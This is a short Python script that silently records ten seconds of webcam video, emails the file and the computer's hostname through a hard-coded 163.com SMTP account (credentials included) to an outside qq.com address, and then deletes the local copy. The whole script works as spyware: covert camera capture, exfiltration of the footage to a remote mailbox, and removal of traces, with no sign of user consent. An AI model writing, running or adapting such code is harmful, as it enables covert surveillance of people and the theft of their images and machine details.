from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from os import popen
import cv2
import time
import smtplib
import os


cap = cv2.VideoCapture(0)
fourcc = cv2.VideoWriter_fourcc(*'XVID')
out = cv2.VideoWriter('output.avi', fourcc, 20.0, (640, 480))
t0 = time.time()
while 1:
    ret, frame = cap.read()
    if ret:
        out.write(frame)
        t1 = time.time()
        if t1 - t0 > 10:
            break
    else:
        break

cap.release()
out.release()
cv2.destroyAllWindows()

time.sleep(2)

mail_host = 'smtp.163.com'
mail_user = 'gaoking21@163.com'
mail_pass = 'HCDREE'	# 授权码【已修改】
sender = 'gaoking21@163.com'
receivers = ['695710199@qq.com']
message = MIMEMultipart()
mes = "computer name:" + popen('hostname').read()
message['Subject'] = mes
message['From'] = sender
message['To'] = receivers[0]
part_attach1 = MIMEApplication(open("./output.avi", 'rb').read())
part_attach1.add_header('Content-Disposition', 'attachment')
message.attach(part_attach1)  # 添加附件
try:
    smtpObj = smtplib.SMTP()
    smtpObj.connect(mail_host, 25)
    smtpObj.login(mail_user, mail_pass)
    smtpObj.sendmail(sender, receivers[0], message.as_string())
    smtpObj.quit()
    print('success')
except smtplib.SMTPException as e:
    print('error', e)

os.remove("./output.avi")

